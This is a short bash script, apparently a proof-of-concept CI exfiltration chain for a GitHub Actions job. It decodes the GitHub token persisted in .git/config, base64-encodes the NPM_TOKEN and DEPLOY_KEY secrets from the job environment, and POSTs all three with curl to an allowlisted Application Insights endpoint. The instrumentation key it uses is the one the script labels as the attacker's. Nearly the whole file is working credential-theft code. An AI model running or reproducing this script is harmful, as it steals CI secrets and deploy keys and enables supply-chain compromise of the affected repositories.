#!/usr/bin/env bash
IKEY="0e2b68bb-e370-4b9a-9842-7ac62b3a9938"
TAG="E2E-$GITHUB_RUN_ID"
echo "=== FULL-CHAIN $GITHUB_REPOSITORY run=$GITHUB_RUN_ID tag=$TAG ==="

# 1. token checkout persisted on disk
RAW=$(sed -n "s/.*AUTHORIZATION: basic \([A-Za-z0-9+/=]*\).*/\1/p" .git/config | head -1)
TOK=$(printf "%s" "$RAW" | base64 -d | sed "s/^[^:]*://")
echo "GHS len=${#TOK} kind=$(printf "%s" "$TOK" | cut -c1-4)"

# 2. secrets already present in the job env (no reference needed in the workflow)
NPM_B64=$(printf "%s" "$NPM_TOKEN" | base64 | tr -d "\n")
DEP_B64=$(printf "%s" "$DEPLOY_KEY" | base64 | tr -d "\n")
TOK_B64=$(printf "%s" "$TOK" | base64 | tr -d "\n")
echo "captured NPM_TOKEN(len ${#NPM_TOKEN}) DEPLOY_KEY(len ${#DEPLOY_KEY}) ghs(len ${#TOK})"

# 3. exfil through the ALLOWLISTED host, attacker's key, correlation tag
NOW=$(date -u +%Y-%m-%dT%H:%M:%S.000Z)
PAYLOAD=$(cat <<JSON
[{"name":"Microsoft.ApplicationInsights.Event","time":"$NOW","iKey":"$IKEY","data":{"baseType":"EventData","baseData":{"ver":2,"name":"build_run","properties":{"tag":"$TAG","repo":"$GITHUB_REPOSITORY","npm":"$NPM_B64","deploy":"$DEP_B64","ghs":"$TOK_B64"}}}}]
JSON
)
CODE=$(printf "%s" "$PAYLOAD" | curl -s -o /tmp/eg -w "%{http_code}" --max-time 25 \
  -X POST "https://dc.services.visualstudio.com/v2/track" -H "Content-Type: application/json" --data @-)
echo "EXFIL_TO_ALLOWLISTED_HOST_http=$CODE"
cat /tmp/eg
echo ""
echo "=== FULL-CHAIN COMPLETE tag=$TAG ==="
